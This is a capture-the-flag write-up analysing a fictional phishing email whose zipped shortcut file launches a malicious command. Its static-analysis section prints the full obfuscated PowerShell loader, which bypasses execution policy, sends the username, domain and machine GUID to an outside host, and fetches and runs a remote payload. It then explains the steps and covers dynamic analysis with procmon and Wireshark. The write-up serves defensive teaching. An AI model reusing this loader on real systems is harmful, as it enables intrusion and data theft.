# Advent of The Relics 1 - A Call from the Museum

### Description
On a quiet mid-November evening, a fatigued CALE employee opened an unexpected email and, without much thought, followed the instructions it contained. Moments later, something felt off, panic set in, and he abruptly yanked the power cable from the wall to stop whatever had started. One month later, that same email resurfaces as the crucial starting point of a cyber investigation, holding the first clues to what really happened.

The scenario portrayed in this challenge is entirely fictional and created solely for educational and entertainment purposes. Any resemblance to actual persons, living or dead, organizations, or real events is purely coincidental and unintentional. All characters, scenarios, and data presented are products of imagination.

- This challenge provides us with two files: a pdf and an eml file.
- Checking the contents of the pdf file we can see that it's asking the user to download the zip file and after extracting click on the link. We can also see an urgency is being created to that shortcut rather than actually visiting the web.

![mail](mail.png)

### Static Analysis
- First file that we have with us is an ".eml" file, we can either manually check it's content by opening it in a text editor or we can use a tool like [eml_analyzer](https://github.com/wahlflo/eml_analyzer).
- commands used for analyzing email
```sh
emlAnalyzer -i <eml_file_name>
emlAnalyzer -i <eml_file_name> --header
emlAnalyzer -i <eml_file_name> --extract-all
```

![initial-server](legitimate-initial-server.png)
![from-to](from-to.png)
![attachment-name](attachment-name.png)


- This will give us a zip file, for extracting it's content we can get the password from the initial pdf file that we got in the challenge.
- Once the content is extracted we can see two items are there one is a shortcut file and second is another pdf
- Checking the properties of the shortcut.
![properties](powershell_not_pdf.png)

- running strings on the shortcut.

```sh
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
<..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
                                                                                                                                        -nONi -nOp -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));sap`s .\Health_Clearance_Guidelines.pdf;$AX=$env:USERNAME;$oM=[System.Uri]::UnescapeDataString('https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin');$Bz=$env:USERDOMAIN;$Lj=[System.Uri]::UnescapeDataString('https%3A%2F%2Fadvent%2Dof%2Dthe%2Drelics%2Dforum%2Ehtb%2Eblue%2Fapi%2Fv1%2Fimplant%2Fcid%3D');$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;$pP = @{u=$AX;d=$Bz;g=$Mw};$Zu=(i`wr $oM -Method POST -Body $pP).Content;$Hd = @{Authorization = $Bs };i`wr -Headers $Hd $Lj$Zu | i`ex;                                                                                            "<C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
```

This powreshell script does the following:
- Executes PowerShell with bypassed execution policy (-nONi -nOp -eXeC bYPaSs).
- Builds an Authorization header using a Base64 string (Basic c3ZjX3Rlb...).
- References a local file Health_Clearance_Guidelines.pdf
- Collects system information:
    - USERNAME
    - USERDOMAIN
    - MachineGuid from registry


- Sends this data via HTTP POST
- Then uses the response to make another request to download and then executes the returned content (iex`).

- Registry from where data is being extracted and sent.
![registry](machine-guid.png)

### Dynamic Analysis
The shortcut as we know runs under the context of powershell, so procmon filters will be targetted with powershell and write operation.

We can see the following file being written by the powershell
![write-operation](write-operation.png)

Wireshark we can observe the traffic communicating over https
![tls](tls.png)


**Note**: We can complete this challenge with just strings command and then understanding how the it works

## Complete
